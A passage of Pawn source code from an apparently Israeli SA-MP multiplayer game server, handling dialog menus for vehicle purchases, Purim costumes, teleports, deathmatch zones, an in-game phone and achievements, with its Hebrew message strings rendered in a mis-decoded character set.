						format(string,sizeof(string)," ~~~ :" @c(white) "[%s]" @c(lightblue) " с-$%d %s ,ўЁщ· р· ф°ыс ф∙Ёщ ∙ьъ ~~~",GetDateAsString(),vstoreinfo[s][vstore_costs][v],GetVehicleName(vstoreinfo[s][vstore_vehicles][v]));
						SendClientMessage(playerid,lightblue,string);
						SendClientMessage(playerid,orange," * /CallV2" @c(yellow) " :ь∙щтх° ф°ыс рьщъ");
						SendClientMessage(playerid,orange," * /VMod SColors2" @c(yellow) " :ь∙ющ°· ЎсЄщ ф°ыс ф∙Ёщ");
					}
					if(vstoreinfo[s][vstore_type] != 1 && vstoreinfo[s][vstore_type] != 2)
					{
						playerinfo[playerid][vehicle][5] = vstoreinfo[s][vstore_vehicles][v], playerinfo[playerid][vehicle][1] = -1, playerinfo[playerid][vehicle][6] = vstoreinfo[s][vstore_costs][v];
						for(new i = 0; i < 2; i++) playerinfo[playerid][pvcol2][i] = random(126);
						if(playerinfo[playerid][logged])
						{
							fsetint(fuser(playerid),"PVehicle3",vstoreinfo[s][vstore_vehicles][v]);
							fsetint(fuser(playerid),"Vehicle3Cost",vstoreinfo[s][vstore_costs][v]);
							fsetint(fuser(playerid),"Vehicle3Color1",playerinfo[playerid][pvcol2][0]);
							fsetint(fuser(playerid),"Vehicle3Color2",playerinfo[playerid][pvcol2][1]);
						}
						format(string,sizeof(string)," ~~~ :" @c(white) "[%s]" @c(lightblue) " с-$%d %s ,ўЁщ· р· ф°ыс ф∙ьщ∙щ хфющхчу ∙ьъ с ~~~",GetDateAsString(),vstoreinfo[s][vstore_costs][v],GetVehicleName(vstoreinfo[s][vstore_vehicles][v]));
						SendClientMessage(playerid,lightblue,string);
						SendClientMessage(playerid,orange," * /CallV3" @c(yellow) " :ь∙щтх° ф°ыс фющхчу рьщщъ");
					}
					SendClientMessage(playerid,orange," * /Mode 18" @c(yellow) " :ьЇўхух· ЁхёЇх· фў∙х°х· с°ыс");
					format(string,sizeof(string)," ╗ /Mode 18 ?°хЎщэ тэ !" @c(red) "%s" @c(orange) " ўЁф °ыс юёхт %s",GetVehicleName(vstoreinfo[s][vstore_vehicles][v]),GetName(playerid));
					SendClientMessageToAll(orange,string);
				}
				case 2: // cc buy
				{
					if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .рщя ьъ ы°шщё р∙°рщ");
					new dialogHeader[64];
					format(dialogHeader,sizeof(dialogHeader),@c(lightblue) "%s | чЁх· ф%s",GetVehicleName(vstoreinfo[s][vstore_vehicles][v]),cpinfo[playerinfo[playerid][cp]][cpname]);
					if(playerinfo[playerid][vehicle][0] != 0 && vstoreinfo[s][vstore_type] != 2 && vstoreinfo[s][vstore_type] != 3) return ShowPlayerDialog(playerid,dialog_vlist3,DIALOG_STYLE_MSGBOX,dialogHeader,@c(red) " /SellV :ыс° щ∙ ьъ °ыс ∙ўЁщ·, ыущ ьюых° рх·х °∙хэ р· фЇўхуф","чцх°","ётх°");
					if(playerinfo[playerid][vehicle][3] != 0 && vstoreinfo[s][vstore_type] != 1 && vstoreinfo[s][vstore_type] != 3) return ShowPlayerDialog(playerid,dialog_vlist3,DIALOG_STYLE_MSGBOX,dialogHeader,@c(red) " /SellV2 :ыс° щ∙ ьъ °ыс ∙Ёщ ∙ўЁщ·, ыущ ьюых° рх·х °∙хэ р· фЇўхуф","чцх°","ётх°");
					if(playerinfo[playerid][vehicle][5] != 0 && vstoreinfo[s][vstore_type] != 2 && vstoreinfo[s][vstore_type] != 1) return ShowPlayerDialog(playerid,dialog_vlist3,DIALOG_STYLE_MSGBOX,dialogHeader,@c(red) " /SellV3 :ыс° щ∙ ьъ °ыс ∙ьщ∙щ ∙ўЁщ·, ыущ ьюых° рх·х °∙хэ р· фЇўхуф","чцх°","ётх°");
					if(playerinfo[playerid][bank] < vstoreinfo[s][vstore_costs][v]) return ShowPlayerDialog(playerid,dialog_vlist3,DIALOG_STYLE_LIST,dialogHeader,@c(red) " .рщя ьъ юёЇщў ыёє","чцх°","ётх°");
					format(string,sizeof(string)," ючЁх· ф°ысщэ %s ўЁщ·",GetVehicleName(vstoreinfo[s][vstore_vehicles][v]));
					UpdateBank(GetName(playerid),string,0-vstoreinfo[s][vstore_costs][v]);
					//SPropertyEarnings(3,vstoreinfo[s][vstore_costs][v],25);
					if(vstoreinfo[s][vstore_type] != 2 && vstoreinfo[s][vstore_type] != 3)
					{
						playerinfo[playerid][vehicle][0] = vstoreinfo[s][vstore_vehicles][v], playerinfo[playerid][vehicle][1] = -1, playerinfo[playerid][vehicle][2] = vstoreinfo[s][vstore_costs][v];
						if(playerinfo[playerid][logged])
						{
							fsetint(fuser(playerid),"PVehicle",vstoreinfo[s][vstore_vehicles][v]);
							fsetint(fuser(playerid),"VehicleCost",vstoreinfo[s][vstore_costs][v]);
						}
						format(string,sizeof(string)," ~~~ :" @c(white) "[%s]" @c(lightblue) " с-$%d срюЎЄх· ы°шщё р∙°рщ %s ўЁщ· р· ф°ыс ~~~",GetDateAsString(),vstoreinfo[s][vstore_costs][v],GetVehicleName(vstoreinfo[s][vstore_vehicles][v]));
						SendClientMessage(playerid,lightblue,string);
						SendClientMessage(playerid,orange," * /CallV" @c(yellow) " :ь∙щтх° ф°ыс рьщъ");
						SendClientMessage(playerid,orange," * /VMod" @c(yellow) " :ь∙ющ°· ЎсЄ рх ∙щЇх°щэ ·ющущщэ ь°ыс");
					}
					if(vstoreinfo[s][vstore_type] != 1 && vstoreinfo[s][vstore_type] != 3)
					{
						playerinfo[playerid][vehicle][3] = vstoreinfo[s][vstore_vehicles][v], playerinfo[playerid][vehicle][1] = -1, playerinfo[playerid][vehicle][4] = vstoreinfo[s][vstore_costs][v];
						if(playerinfo[playerid][logged])
						{
							fsetint(fuser(playerid),"PVehicle2",vstoreinfo[s][vstore_vehicles][v]);
							fsetint(fuser(playerid),"Vehicle2Cost",vstoreinfo[s][vstore_costs][v]);
						}
						format(string,sizeof(string)," ~~~ :" @c(white) "[%s]" @c(lightblue) " с-$%d срюЎЄх· ы°шщё р∙°рщ %s ,ўЁщ· р· ф°ыс ф∙Ёщ ∙ьъ ~~~",GetDateAsString(),vstoreinfo[s][vstore_costs][v],GetVehicleName(vstoreinfo[s][vstore_vehicles][v]));
						SendClientMessage(playerid,lightblue,string);
						SendClientMessage(playerid,orange," * /CallV2" @c(yellow) " :ь∙щтх° ф°ыс рьщъ");
						SendClientMessage(playerid,orange," * /VMod SColors2" @c(yellow) " :ь∙ющ°· ЎсЄщ ф°ыс ф∙Ёщ");
					}
					if(vstoreinfo[s][vstore_type] != 1 && vstoreinfo[s][vstore_type] != 2)
					{
						playerinfo[playerid][vehicle][5] = vstoreinfo[s][vstore_vehicles][v], playerinfo[playerid][vehicle][1] = -1, playerinfo[playerid][vehicle][6] = vstoreinfo[s][vstore_costs][v];
						if(playerinfo[playerid][logged])
						{
							fsetint(fuser(playerid),"PVehicle3",vstoreinfo[s][vstore_vehicles][v]);
							fsetint(fuser(playerid),"Vehicle3Cost",vstoreinfo[s][vstore_costs][v]);
						}
						format(string,sizeof(string)," ~~~ :" @c(white) "[%s]" @c(lightblue) " с-$%d срюЎЄх· ы°шщё р∙°рщ %s ,ўЁщ· р· ф°ыс ф∙ьщ∙щ хфющхчу ∙ьъ с ~~~",GetDateAsString(),vstoreinfo[s][vstore_costs][v],GetVehicleName(vstoreinfo[s][vstore_vehicles][v]));
						SendClientMessage(playerid,lightblue,string);
						SendClientMessage(playerid,orange," * /CallV3" @c(yellow) " :ь∙щтх° ф°ыс фющхчу рьщщъ");
					}
					SendClientMessage(playerid,orange," * /Mode 18" @c(yellow) " :ьЇўхух· ЁхёЇх· фў∙х°х· с°ыс");
					format(string,sizeof(string)," ╗ /Mode 18 ?°хЎщэ тэ !" @c(red) "%s" @c(orange) " ўЁф °ыс юёхт %s",GetVehicleName(vstoreinfo[s][vstore_vehicles][v]),GetName(playerid));
					SendClientMessageToAll(orange,string);
				}
			}
		} else command(playerid,"/vlist");
		case dialog_vlist3: if(response)
		{
		    if(GetPlayerCheckpoint(playerid) != cp_vstore || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· °ысщэ ыь∙фщ· ьсщЎхЄ фЇЄхьф фцх");
			new s = playerinfo[playerid][vlistdia][0], v = playerinfo[playerid][vlistdia][1], dialogHeader[64];
			format(dialogHeader,sizeof(dialogHeader),@c(lightblue) "%s | чЁх· ф%s",GetVehicleName(vstoreinfo[s][vstore_vehicles][v]),cpinfo[playerinfo[playerid][cp]][cpname]);
			format(string,sizeof(string),@c(yellow) "ЎЇщщф с°ыс\n" @c(yellow) "(ўЁщщф ($%d\n" @c(yellow) "ўЁщщф сы°шщё р∙°рщ",vstoreinfo[s][vstore_costs][v]);
			ShowPlayerDialog(playerid,dialog_vlist2,DIALOG_STYLE_LIST,dialogHeader,string,"сч°","чцх°");
		}
		case dialog_purim: if(response)
		{
			playerinfo[playerid][purim] = -1;
			if(listitem < 8) playerinfo[playerid][purim] = listitem;
			new weap = -1;
			for(new i = aoslot_purim; i <= aoslot_purim+4; i++) if(IsPlayerAttachedObjectSlotUsed(playerid,i)) RemovePlayerAttachedObject(playerid,i);
			switch(listitem)
			{
				case 0: // Heart
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,1240,1,-0.2,0.0,0.0,0.0,90.0,0.0,4.0,4.0,4.0);
					format(string,sizeof(string),"%s is now Heart",GetName(playerid));
					SendClientMessageToAll(pink,string);
				}
				case 1: // Parrot
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,19078,1,-0.7,-0.3,0.0,0.0,0.0,0.0,4.0,4.0,4.0);
					format(string,sizeof(string),"%s is now Parrot",GetName(playerid));
					SendClientMessageToAll(green,string);
				}
				case 2: // Mr.Animal
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,1608,5,0.0,0.0,0.0,270.0,0.0,0.0,0.05,0.05,0.05);
					SetPlayerAttachedObject(playerid,aoslot_purim+1,1607,6,0.0,0.0,0.0,90.0,0.0,0.0,0.06,0.06,0.06);
					SetPlayerAttachedObject(playerid,aoslot_purim+2,1603,1,0.65,0.03,0.0,0.0,90.0,0.0,0.5,0.5,0.5);
					SetPlayerAttachedObject(playerid,aoslot_purim+3,1609,1,0.0,0.0,0.0,90.0,0.0,270.0,0.25,0.25,0.25);
					format(string,sizeof(string),"%s is now Mr.Animal",GetName(playerid));
					SendClientMessageToAll(brown,string);
				}
				case 3: // Cop
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,18637,5,0.0,0.0,0.0,180.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+1,18643,6,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+2,18636,2,0.15,0.03,0.0,90.0,90.0,0.0,1.0,1.0,1.0);
					format(string,sizeof(string),"%s is now Cop",GetName(playerid));
					SendClientMessageToAll(blue,string);
					weap = 22;
					SetPlayerSkillLevel(playerid,0,200);
				}
				case 4: // Fire Man
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,18688,1,-0.4,0.0,-1.7,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+1,18693,5,0.0,0.0,-1.5,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+2,18693,6,0.0,0.0,1.5,180.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+3,18699,9,0.0,0.0,1.5,180.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+4,18699,10,0.0,0.0,1.5,180.0,0.0,0.0,1.0,1.0,1.0);
					format(string,sizeof(string),"%s is now Fire Man",GetName(playerid));
					SendClientMessageToAll(orange,string);
				}
				case 5: // Builder
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,18638,2,0.15,0.03,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+1,18635,6,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
					format(string,sizeof(string),"%s is now Builder",GetName(playerid));
					SendClientMessageToAll(yellow,string);
					SendClientMessage(playerid,white,"Make yourself useful!");
					weap = 5;
				}
				case 6: // Fisherman
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,18639,2,0.15,0.03,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+1,18632,5,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
					format(string,sizeof(string),"%s is now Fisherman",GetName(playerid));
					SendClientMessageToAll(purple,string);
				}
				case 7: // Pirate
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,19085,2,0.09,0.02,0.0,90.0,90.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+1,19078,3,0.0,0.0,0.0,140.0,180.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+2,3028,5,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+3,339,6,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+4,339,2,-0.03,0.11,-0.2,0.0,0.0,0.0,0.5,0.5,0.5);
					format(string,sizeof(string),"%s is now Pirate",GetName(playerid));
					SendClientMessageToAll(lightyellow,string);
					weap = 8;
				}
				case 8: // Contact
				{
					ShowPlayerDialog(playerid,dialog_purim2,DIALOG_STYLE_INPUT,@c(lightblue) "∙ьщч· °Єщхя",@c(grey) ":°∙хэ ыря р· ф°Єщхя ь·чЇх∙·","∙ьч","сщшхь");
				}
				case 9: // Remove
				{
					SendClientMessage(playerid,white," .фё°· р· ф·чЇх∙·");
				}
			}
			if(weap != 22) SetPlayerSkillLevel(playerid,0,999);
			if(weap != -1) GiveWeapon(playerid,weap,10000);
		}
		case dialog_purim2:
		{
			if(response)
			{
				if(equal(inputtext,"code-bh"))
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,3028,6,0.0,0.0,0.0,180.0,0.0,0.0,1.2,1.0,1.8);
					SetPlayerAttachedObject(playerid,aoslot_purim+1,19315,1,-0.9,0.1,0.0,90.0,90.0,0.0,2.5,1.5,1.5);
					format(string,sizeof(string),"%s is now Nazgul",GetName(playerid));
					SendClientMessageToAll(black,string);
				}
				else if(equal(inputtext,"code-glady"))
				{
					SetPlayerAttachedObject(playerid,aoslot_purim,18741,9,0.0,0.0,-1.65,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+1,18741,10,0.0,0.0,-1.65,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+2,18697,1,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_purim+3,18707,1,1.0,0.0,-1.5,0.0,0.0,0.0,1.0,1.0,1.0);
					format(string,sizeof(string),"%s {7BA7E1}is {6094DB}now {CEDEF4}Galadriel",GetName(playerid));
					SendClientMessageToAll(white,string);
					for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) PlayAudioStreamForPlayer(i,audio_url "i_will_carry_the_ring_create.wav");
				}
				else
				{
					new File:f = fopen(file_purim,io_append);
					format(string,sizeof(string),"- [%s %s] Suggestion from %s (%s): %s\r\n",GetDateAsString(),GetTimeAsString(),GetName(playerid),GetIP(playerid),inputtext);
					fwrite(f,string);
					fclose(f);
			  		SendClientMessage(playerid,green," :·хуф Єь ффЎЄф ь·чЇх∙·");
			  		SendClientMessage(playerid,green,inputtext);
			  		SendClientMessage(playerid,green," Х .сющуф хцф щ·рщэ, Ёхёщє р· цф сў°хс");
		  		}
			}
			else command(playerid,"/purim 2");
		}
		case dialog_stunting: if(response)
		{
			new v = GetPlayerVehicleID(playerid);
			SetVehiclePos(v,Stunting[listitem][stSpawn][0],Stunting[listitem][stSpawn][1],Stunting[listitem][stSpawn][2],playerid);
			SetVehicleZAngle(v,Stunting[listitem][stSpawn][3]);
			LinkVehicleToInterior(v,0);
			SetPlayerInterior(playerid,0);
			SetPlayerRaceCheckpoint(playerid,3,Stunting[listitem][stEnd][0],Stunting[listitem][stEnd][1],Stunting[listitem][stEnd][2],Stunting[listitem][stEnd][0],Stunting[listitem][stEnd][1],Stunting[listitem][stEnd][2],6.5);
			playerinfo[playerid][instunting] = listitem;
			SavePlayerWeapons(playerid);
			ResetWeapons(playerid);
			SetVehicleVirtualWorld(v,world_stunting);
			SetPlayerVirtualWorld(playerid,world_stunting);
			format(string,sizeof(string)," ~~~ :с°хъ фср ьр·т° фёшрЁшщэ юёЇ° #%d ~~~",listitem + 1);
			SendClientMessage(playerid,lightblue,string);
			SendClientMessage(playerid,yellow," .(Єьщъ ьф∙·ю∙ сёшрЁшщэ хЇЄьхьщэ Єь юЁ· ьфтщЄ ьюЄть фрухэ (фЎ'ўЇхщЁш");
			SendClientMessage(playerid,yellow," .сющуф х·Ўьщч ·цыф с-15$");
			SendClientMessage(playerid,green," !сфЎьчф");
		}
		case dialog_stuntstele:
		{
			if(response)
			{
				new teleid = -1, c = 0;
				for(new i = 0; i < sizeof(Teleports) && teleid == -1; i++) if(Teleports[i][Ttype] == tele_stunts)
				{
					if(c == listitem) teleid = i;
					c++;
				}
				if(teleid == -1) return SendClientMessage(playerid,red," .∙щтх° ьр ЁюЎр");
				Teleport(playerid,teleid);
			}
		}
		case dialog_challenges:
		{
			if(response)
			{
				new teleid = -1, c = 0;
				for(new i = 0; i < sizeof(Teleports) && teleid == -1; i++) if(Teleports[i][Ttype] == tele_challenge)
				{
					if(c == listitem) teleid = i;
					c++;
				}
				if(teleid == -1) return SendClientMessage(playerid,red," .∙щтх° ьр ЁюЎр");
				Teleport(playerid,teleid);
			}
		}
		case dialog_parachuting:
		{
			if(response)
			{
				new teleid = -1, c = 0;
				for(new i = 0; i < sizeof(Teleports) && teleid == -1; i++) if(Teleports[i][Ttype] == tele_parachuting)
				{
					if(c == listitem) teleid = i;
					c++;
				}
				if(teleid == -1) return SendClientMessage(playerid,red," .∙щтх° ьр ЁюЎр");
				Teleport(playerid,teleid);
			}
		}
		case dialog_dm: if(response)
		{
			if(listitem == sizeof(DMZs)) command(playerid,"/quitdmz");
			else
			{
				if(DMZs[listitem+1][dmzWorlds] > 1)
				{
					format(string,sizeof(string),@c(green) ":щ∙ %d Єхьюх·, фўьу юёЇ° сщя 1 ь %d ыущ ьсчх° рчу юфэ %s ьрцх° фущрэ",DMZs[listitem+1][dmzWorlds],DMZs[listitem+1][dmzWorlds],DMZs[listitem+1][dmzName]);
					ShowPlayerDialog(playerid,dialog_dmworld,DIALOG_STYLE_INPUT,@c(lightblue) "счщ°· Єхьэ ∙ь рцх° ущрэ",string,"сч°","чцх°");
					playerinfo[playerid][clickon] = listitem + 1;
				}
				else command(playerid,DMZs[listitem+1][dmzCmd]);
			}
		}
		case dialog_dmworld:
		{
			if(response)
			{
				new n = !strlen(inputtext) || !IsNumeric(inputtext) ? 0 : strval(inputtext);
				if(n < 1 || n > DMZs[playerinfo[playerid][clickon]][dmzWorlds])
				{
					format(string,sizeof(string),@c(red) ".сч°· юёЇ° Єхьэ ∙тхщ\n" @c(green) ":щ∙ %d Єхьюх·, фўьу юёЇ° сщя 1 ь %d ыущ ьсчх° рчу юфэ %s ьрцх° фущрэ",DMZs[playerinfo[playerid][clickon]][dmzWorlds],DMZs[playerinfo[playerid][clickon]][dmzWorlds],DMZs[playerinfo[playerid][clickon]][dmzName]);
					ShowPlayerDialog(playerid,dialog_dmworld,DIALOG_STYLE_INPUT,@c(lightblue) "счщ°· Єхьэ ∙ь рцх° ущрэ",string,"сч°","чцх°");
				}
				else
				{
					format(string,sizeof(string),"%s %d",DMZs[playerinfo[playerid][clickon]][dmzCmd],DMZs[playerinfo[playerid][clickon]][dmzWorlds]);
					command(playerid,string);
				}
			}
			else command(playerid,"/dm");
		}
		case dialog_phone: if(response)
		{
			playerinfo[playerid][phoneoption] = listitem;
			switch(listitem)
			{
				case 0: /* call */ ShowPlayerDialog(playerid,dialog_phone2,DIALOG_STYLE_INPUT,ColouredText("ф·ў∙°",playerinfo[playerid][phonedesign]),ColouredText(" :фўьу ыщЁхщ / чьў юыщЁхщ / ∙э Ї°шщ / рщщущ",playerinfo[playerid][phonedesign]),"ф·ў∙°","сщшхь");
				case 1: /* answer */ command(playerid,"/answer");
				case 2: /* hangup */ command(playerid,"/hangup");
				case 3: /* sms */ ShowPlayerDialog(playerid,dialog_phone2,DIALOG_STYLE_INPUT,ColouredText("SMS",playerinfo[playerid][phonedesign]),ColouredText(" :фўьу ыщЁхщ / чьў юыщЁхщ / ∙э Ї°шщ / рщщущ",playerinfo[playerid][phonedesign]),"SMS ∙ьч","сщшхь");
				case 4: /* admin msg */
				{
					if(IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .рующЁщэ ьр щыхьщэ ьф∙·ю∙ срхЇЎщф цх");
					if(!playerinfo[playerid][cana][0]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фрхЇЎщф фцх ∙хс сў°хс");
					ShowPlayerDialog(playerid,dialog_phone2,DIALOG_STYLE_INPUT,ColouredText("фхуЄф ьрующЁщэ",playerinfo[playerid][phonedesign]),ColouredText(" :фўьу р· ффхуЄф",playerinfo[playerid][phonedesign]),"SMS ∙ьч","сщшхь");
				}
				case 5: /* clan msg */
				{
					if(!playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .р·ф ьр сўьря");
					ShowPlayerDialog(playerid,dialog_phone2,DIALOG_STYLE_INPUT,ColouredText("фхуЄф ьўьря",playerinfo[playerid][phonedesign]),ColouredText(" :фўьу р· ффхуЄф",playerinfo[playerid][phonedesign]),"SMS ∙ьч","сщшхь");
				}
				case 6: /* 100 */
				{
					new cops = 0;
					format(string,sizeof(string)," --- !Ў°щъ ю∙ш°ф %s ---",GetName(playerid));
					for(new i=0;i<MAX_PLAYERS_;i++)
					{
						if(playerinfo[i][work] == work_cop)
						{
							cops++;
							SendClientMessage(i,red,string);
						}
					}
					if(!cops) return SendClientMessage(playerid,red," .рщя ∙хш°щэ ыЄ· с∙°· хьыя ффхуЄф ьр Ё∙ьчф");
					format(string,sizeof(string)," !ффхуЄф Ё∙ьчф ь-%d ∙хш°щэ ∙ЁюЎрщэ ы°тЄ с∙°·",cops);
					SendClientMessage(playerid,green,string);
				}
				case 7: /* 101 */
				{
					new doctors = 0;
					format(string,sizeof(string)," --- !Ў°щъ рюсхьЁё %s ---",GetName(playerid));
					for(new i=0;i<MAX_PLAYERS_;i++)
					{
						if(playerinfo[i][work] == work_doctor)
						{
							doctors++;
							SendClientMessage(i,red,string);
						}
					}
					if(!doctors) return SendClientMessage(playerid,red," .рщя °хЇрщэ ыЄ· с∙°· хьыя ффхуЄф ьр Ё∙ьчф");
					format(string,sizeof(string)," !ффхуЄф Ё∙ьчф ь-%d °хЇрщэ ∙ЁюЎрщэ ы°тЄ с∙°·",doctors);
					SendClientMessage(playerid,green,string);
				}
				case 8: /* model */ ShowPlayerDialog(playerid,dialog_phone2,DIALOG_STYLE_INPUT,ColouredText("фчьє юхуь",playerinfo[playerid][phonedesign]),ColouredText(" :фўьу юёЇ° юхуь ю 1 Єу 10",playerinfo[playerid][phonedesign]),"фчьє","сщшхь");
				case 9: /* design */ ShowPlayerDialog(playerid,dialog_phone2,DIALOG_STYLE_LIST,ColouredText("фчьє ЄщЎхс",playerinfo[playerid][phonedesign]),@c(white)"ься\n"@c(black)"∙чх°\n"@c(red)"рухэ\n"@c(yellow)"Ўфхс\n"@c(green)"щ°хў\n"@c(blue)"ычхь\n"@c(grey)"рЇх°\n"@c(pink)"х°ху\n"@c(purple)"ётхь\n"@c(orange)"ы·хэ\n"@c(brown)"чхэ\n"@c(white)"рч°","фчьє","сщшхь");
			}
		}
		case dialog_phone2: if(response)
		{
			switch(playerinfo[playerid][phoneoption])
			{
				case 0: /* call */
				{
					new id = INVALID_PLAYER_ID;
					if(IsNumeric(inputtext)) id = strval(inputtext);
					else
					{
						for(new i = 0; i < MAX_PLAYERS_ && id == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && (equal(GetName(i),inputtext) || (PlayerDefinedName(i) && equal(playerinfo[i][rname],inputtext)))) id = i;
						if(id == INVALID_PLAYER_ID) for(new i = 0; i < MAX_PLAYERS_ && id == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && strfind(GetName(i),inputtext,true) != -1) id = i;
					}
					if(id == INVALID_PLAYER_ID) SendClientMessage(playerid,red," .∙чўя ьр ЁюЎр");
					else
					{
						format(string,sizeof(string),"/call %d",id);
						command(playerid,string);
					}
				}
				case 1: /* answer */ command(playerid,"/answer");
				case 3: /* sms */
				{
					new id = INVALID_PLAYER_ID;
					if(IsNumeric(inputtext)) id = strval(inputtext);
					else
					{
						for(new i = 0; i < MAX_PLAYERS_ && id == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && (equal(GetName(i),inputtext) || (PlayerDefinedName(i) && equal(playerinfo[i][rname],inputtext)))) id = i;
						if(id == INVALID_PLAYER_ID) for(new i = 0; i < MAX_PLAYERS_ && id == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && strfind(GetName(i),inputtext,true) != -1) id = i;
					}
					if(id == INVALID_PLAYER_ID) SendClientMessage(playerid,red," .∙чўя ьр ЁюЎр");
					else
					{
						playerinfo[playerid][clickon] = id;
						format(string,sizeof(string),ColouredText(" %s // SMS",playerinfo[playerid][phonedesign]),GetName(id));
						ShowPlayerDialog(playerid,dialog_pm,DIALOG_STYLE_INPUT,string,ColouredText(" :°∙хэ р· ·хыя ффхуЄф ыря",playerinfo[playerid][phonedesign]),"∙ьч","сщшхь");
					}
				}
				case 4: /* admin msg */
				{
					format(string,sizeof(string),"/a %s",inputtext);
					command(playerid,string);
				}
				case 5: /* clan msg */
				{
					format(string,sizeof(string),"!%s",inputtext);
					OnPlayerText(playerid,string);
				}
				case 8: /* model */
				{
					new newmodel = strval(inputtext);
					if(newmodel < 1 || newmodel > 10) return SendClientMessage(playerid,red," .юёЇ° юхуь ∙тхщ, сч° юёЇ° ю 1 Єу 10");
					playerinfo[playerid][phonemodel] = newmodel - 1;
					if(playerinfo[playerid][calling] != -1) UpdatePlayerCellPhoneUsing(playerid);
					format(string,sizeof(string)," .фчьЇ· юхуь ЇьрЇхя ьюхуь %02d",newmodel);
					SendClientMessage(playerid,green,string);
					if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"PhoneModel",newmodel-1);
				}
				case 9: /* design */
				{
					if(listitem == 11) SendClientMessage(playerid,white," /phonedesign :ь∙щЁхщ ЄщЎхс фЇьрЇхя ьЄщЎхс рч° ∙ьр с°∙щюф щ∙ ьф∙·ю∙ сЇўхуф");
					else
					{
						new arr[] = {white,black,red,yellow,green,blue,grey,pink,purple,orange,brown};
						playerinfo[playerid][phonedesign] = arr[listitem];
						SendClientMessage(playerid,playerinfo[playerid][phonedesign]," .фчьЇ· р· ЄщЎхс фЇьрЇхя ьЎсЄ ффхуЄф фцх");
						if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"PhoneDesign",playerinfo[playerid][phonedesign]);
					}
				}
			}
		}
		case dialog_achievements: if(response)
		{
			new head[32];
			format(head,sizeof(head),@c(lightblue) "ю∙щюф #%d - %s",Achievements[listitem][achName],listitem+1);
			format(string,sizeof(string),@c(lightred) "юш°ф\n" @c(white) "%s\n" @c(lightred) "цюя\n" @c(white) "ы-%d уўх· = %d ∙Ёщх·\n" @c(lightred) "Ї°ё\n" @c(white) "%d$",Achievements[listitem][achText],Achievements[listitem][achTime],Achievements[listitem][achTime]/60,Achievements[listitem][achPrize]);
			ShowPlayerDialog(playerid,dialog_achievement,DIALOG_STYLE_MSGBOX,head,string,"!ф·чь","чц°ф");
			playerinfo[playerid][choosenach] = listitem;
		}
		case dialog_achievement: if(response)
		{
		    if(response)
		    {
				playerinfo[playerid][ach][0] = playerinfo[playerid][choosenach], playerinfo[playerid][ach][1] = 0, playerinfo[playerid][ach][2] = SetTimerEx("EndAchievement",Achievements[playerinfo[playerid][choosenach]][achTime]*1000,0,"ii",playerid,0);
				format(string,sizeof(string)," ~~~ :ф·чь· р· ю∙щюф #%d ~~~",playerinfo[playerid][choosenach]+1);
				SendClientMessage(playerid,lightblue,string);
				SendClientMessage(playerid,yellow," :цых° ыщ фюш°ф ∙ьъ фщр");
				SendClientMessage(playerid,white,Achievements[playerinfo[playerid][choosenach]][achName]);
				format(string,sizeof(string)," щ∙ ьъ %d ∙Ёщх· (%d уўх·) ьёщщэ р· фю∙щюф",Achievements[playerinfo[playerid][choosenach]][achTime],Achievements[playerinfo[playerid][choosenach]][achTime]/60);
				SendClientMessage(playerid,yellow,string);
				format(string,sizeof(string)," .сющуф х·Ўьщч ·цыф с-%d$",Achievements[playerinfo[playerid][choosenach]][achPrize]);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,green," ╗ !сфЎьчф");
			}
			else command(playerid,"/ach start");
		}
		case dialog_atm: if(response)
		{
			switch(listitem)
			{
				case 0: command(playerid,"/withdraw");
				case 1: command(playerid,"/withdrawall");
				case 2: command(playerid,"/balance");
			}
		}
		case dialog_clogs: if(response)
		{
			/*new File:f = fopen(file_admins,io_read), read[M_S], adminparams[2][64], i = 0, pf[64];
			switch(listitem)
			{
				case 0: // view logs
				{
					SendClientMessage(playerid,white,"1");
